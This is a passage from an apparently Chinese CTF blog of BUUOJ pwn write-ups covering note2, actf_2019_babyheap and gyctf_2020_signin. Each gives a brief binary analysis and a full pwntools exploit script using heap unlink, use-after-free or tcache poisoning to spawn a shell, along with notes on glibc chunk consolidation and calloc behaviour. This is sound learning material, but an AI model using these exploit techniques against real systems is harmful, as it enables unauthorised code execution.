src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/8.png" class=""><h5 id="show函数"><a href="#show函数" class="headerlink" title="show函数"></a>show函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/9.png" class=""><p>没啥毛病，在ptr中有记录此堆块的内容指针，就打印出来</p><h5 id="edit函数"><a href="#edit函数" class="headerlink" title="edit函数"></a>edit函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/10.png" class=""><h5 id="delete函数"><a href="#delete函数" class="headerlink" title="delete函数"></a>delete函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/11.png" class=""><p>free掉之后清零了，不存在uaf，我们的目的是劫持刚刚的堆块表，这里没有uaf，堆块大小也限制了，考虑用unlink</p><h4 id="0x02-解题思路-1"><a href="#0x02-解题思路-1" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><p>1.布置堆风水，为unlink做铺垫</p><p>2.unlink使得ptr[0] = ptr[0] - 0x18</p><p>3.修改堆指针为atoi@got，show它泄露libc地址</p><p>4.修改atoi@got为system@got</p><h4 id="0x03-完整EXP-1"><a href="#0x03-完整EXP-1" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;note2&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;note2&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;25066&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the length of the note content:(less than 128)&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the note content:&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,chioce,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;do you want to overwrite or append?[1.overwrite/2.append]&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(chioce))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Input the id of the note:&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your name:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;zyen&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Input your address:&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fake_fd = ptr - <span class="number">0x18</span></span><br><span class="line">fake_bk = ptr - <span class="number">0x10</span></span><br><span class="line">fake_content0 = <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>+p64(<span class="number">0xa1</span>)+p64(fake_fd)+p64(fake_bk)</span><br><span class="line">add(<span class="number">0x80</span>,fake_content0)</span><br><span class="line">add(<span class="number">0x0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;is &quot;</span>)</span><br><span class="line"></span><br><span class="line">atoi_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;atoi_addr : &#x27;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr : &#x27;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04-总结-1"><a href="#0x04-总结-1" class="headerlink" title="0x04 总结"></a>0x04 总结</h4><h5 id="1-unlink注意事项"><a href="#1-unlink注意事项" class="headerlink" title="1.unlink注意事项"></a>1.unlink注意事项</h5><p>刚开始对这个payload匪夷所思</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0xa0</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x0</span>,payload)</span><br></pre></td></tr></table></figure><p><strong>向后合并</strong>的源码如下</p><ul><li><p>我们发现它首先会判断<strong>prev_inuse</strong>是否为0，而在此题目中的堆块是fastbin范畴的堆块，所以当它被free的时候并不会把<strong>prev_inuse</strong>置为0，需要我们手动置零</p></li><li><p>将<strong>prev_size</strong>拿出来加上它本来的大小变成它unlink结束之后堆块的大小</p></li><li><p>根据当前的chunk的<strong>prev_size</strong>来获取到前一个堆块的指针（这里的向后合并其实是向低地址合并</p></li><li><p>开始unlink~</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line"></span><br><span class="line">    prevsize = prev_size (p);</span><br><span class="line">    size += prevsize;</span><br><span class="line">    p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">    unlink(av, p, bck, fwd);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然复习到向后合并，那就…</p><p><strong>向前合并</strong>的源码</p><p>和向后合并相比，向前合并的源码就简单一些</p><ul><li>先会判断是不是和top chunk相邻，相邻就合并了</li><li>如果nextinuse是1就修改它的prev_inuse为0</li><li>unlink完事之后把size改为合并后的size</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (nextchunk != av-&gt;top)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!nextinuse) &#123;</span><br><span class="line">        unlink(av, nextchunk, bck, fwd);</span><br><span class="line">        size += nextsize;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line">    ...</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        size += nextsize;</span><br><span class="line">        set_head(p, size | PREV_INUSE);</span><br><span class="line">        av-&gt;top = p;</span><br><span class="line">        check_chunk(av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="actf-2019-babyheap"><a href="#actf-2019-babyheap" class="headerlink" title="actf_2019_babyheap"></a>actf_2019_babyheap</h3><h4 id="0x00-基本信息-2"><a href="#0x00-基本信息-2" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/14.png" class=""><h4 id="0x01-IDA分析-2"><a href="#0x01-IDA分析-2" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><p>先看看free函数</p><h5 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/15.png" class=""><p>经典uaf</p><h5 id="create函数"><a href="#create函数" class="headerlink" title="create函数"></a>create函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.png" class=""><p>经典之不能再经典</p><h5 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a>print函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/16.jpg" class=""><p>留了一个后门函数，直接执行内容，在初始化的时候我们看到了system函数</p><h4 id="0x02-解题思路-2"><a href="#0x02-解题思路-2" class="headerlink" title="0x02 解题思路"></a>0x02 解题思路</h4><h4 id="0x03-完整EXP-2"><a href="#0x03-完整EXP-2" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;ACTF_2019_babyheap&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26654</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ACTF_2019_babyheap&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,payload</span>):</span>                                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input size: \n&quot;</span>,<span class="built_in">str</span>(size))      </span><br><span class="line">    io.sendafter(<span class="string">&quot;Please input content: \n&quot;</span>,payload)         </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span>                                           </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line">                                                             </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_this</span>(<span class="params">index</span>):</span>                                       </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)                    </span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Please input list index: \n&quot;</span>,<span class="built_in">str</span>(index)) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">create(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>,p64(<span class="number">0x602010</span>) + p64(elf.symbols[<span class="string">&quot;system&quot;</span>]))<span class="comment">#0x602010是/bin/sh</span></span><br><span class="line">print_this(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a>gyctf_2020_signin</h3><h4 id="0x00-基本信息-3"><a href="#0x00-基本信息-3" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/17.png" class=""><p>题目描述是在ubuntu18里面的，所以有tache机制</p><h4 id="0x01-IDA分析-3"><a href="#0x01-IDA分析-3" class="headerlink" title="0x01 IDA分析"></a>0x01 IDA分析</h4><h5 id="del函数"><a href="#del函数" class="headerlink" title="del函数"></a>del函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/18.png" class=""><p>虽然把flags清零了，但是ptrlist没有清零</p><h5 id="add函数-1"><a href="#add函数-1" class="headerlink" title="add函数"></a>add函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/19.png" class=""><p>只能分配0xF个chunk，有个ptrlist存在bss段上</p><h5 id="edit函数-1"><a href="#edit函数-1" class="headerlink" title="edit函数"></a>edit函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/20.png" class=""><p>cnt是一个全局变量，值为1，所以edit函数只能eait一次，一开始想劫持tache不过只能只能edit一次</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/21.jpg" class=""><h5 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h5><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/22.png" class=""><p>calloc一下就判断ptr的值是否为0，不为0就起一个shell，ptr是bss段上的一个变量</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/23.jpg" class=""><h4 id="0x02解题思路"><a href="#0x02解题思路" class="headerlink" title="0x02解题思路"></a>0x02解题思路</h4><ol><li>分配8个chunk并free掉，会有一个chunk进入fastbin</li><li>add回来一个chunk</li><li>修改fastbin中的堆块的fd</li><li>执行后门函数</li></ol><h4 id="0x03-完整EXP-3"><a href="#0x03-完整EXP-3" class="headerlink" title="0x03 完整EXP"></a>0x03 完整EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;gyctf_2020_signin&#x27;</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;gyctf_2020_signin&#x27;</span></span><br><span class="line">port = <span class="string">&#x27;26743&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;Content: &#x27;)</span></span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;your choice?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>)</span><br><span class="line">payload = p64(<span class="number">0x4040C0</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h4><h5 id="1-calloc分配堆块机制"><a href="#1-calloc分配堆块机制" class="headerlink" title="1.calloc分配堆块机制"></a>1.calloc分配堆块机制</h5><p>calloc分配堆块<strong>是不会从tache里面获取堆块的，在calloc的时候会从fastbin里面拿堆块，并且当它去取堆块的时候会把fastbin剩余的堆块放到tache里面</strong></p><p>实验一下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *c1,*c2,*c3,*c4,*c5,*c6,*c7,*c8;</span><br><span class="line"><span class="keyword">void</span> *c9,*c10;</span><br><span class="line">c1 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c2 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c4 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c5 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c6 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c7 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">c8 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c9 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line">c10 = <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(c1);</span><br><span class="line"><span class="built_in">free</span>(c2);</span><br><span class="line"><span class="built_in">free</span>(c3);</span><br><span class="line"><span class="built_in">free</span>(c4);</span><br><span class="line"><span class="built_in">free</span>(c5);</span><br><span class="line"><span class="built_in">free</span>(c6);</span><br><span class="line"><span class="built_in">free</span>(c7);</span><br><span class="line">    <span class="comment">//fastbin</span></span><br><span class="line"><span class="built_in">free</span>(c8);</span><br><span class="line"><span class="built_in">free</span>(c9);</span><br><span class="line"><span class="built_in">free</span>(c10);</span><br><span class="line"></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x20</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/24.png" class=""><p>在tache bin attack中也实验过了，malloc只有当tache中的bin分配完了之后才会把fastbin里面的堆块拿到tache里面，calloc不一样啊！！！</p><p>明白了这一点就很简单了直接<strong>tcache poisoning</strong>改到ptr-0x10的位置，之后触发后门函数就可以getshell了！</p><h3 id="ciscn-2019-en-3"><a href="#ciscn-2019-en-3" class="headerlink" title="ciscn_2019_en_3"></a>ciscn_2019_en_3</h3><h4 id="0x00-基本信息-4"><a href="#0x00-基本信息-4" class="headerlink" title="0x00 基本信息"></a>0x00 基本信息</h4><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/25.png" class=""><p>保护全开不说，还多了一个FORTIFY，这是个啥？</p><img src="/2021/10/05/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E4%B9%8BPWN%E7%B3%BB%E5%88%97/26.png" class=""><p>就是说定义此宏会导致执行一些轻量级检查，以在使用各种字符串和内存操作函数（例如<code>memcpy</code>，<code>memset</code>、<code>stpcpy</code>、<code>strcpy</code>、<code>strncpy</code>、<code>strcat</code>、<code>strncat</code>、<code>sprintf</code>、<code>snprintf</code>、<code>vsprintf</code>、 <code>vsnprintf</code>、<code>gets</code>、 及其宽字符变体）时检测一些缓冲区溢出错误</p><p>比如printf就变成了printf_chk，它将可以检查格式化字符串漏洞的特殊字符，就像下面这样</p><img 